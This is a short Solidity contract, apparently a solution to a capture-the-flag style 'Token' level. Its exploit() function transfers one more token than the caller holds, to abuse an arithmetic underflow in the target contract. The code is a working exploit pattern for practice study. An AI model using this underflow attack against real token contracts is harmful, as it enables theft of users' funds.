// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;
import "@levels/Token.sol";

contract Attacker {
    Token public target;

    constructor(address _target) payable {
        target = Token(_target);
    }

    receive() external payable {}

    function exploit() public payable {
        target.transfer(address(target), target.balanceOf(address(this)) + 1);
    }
}
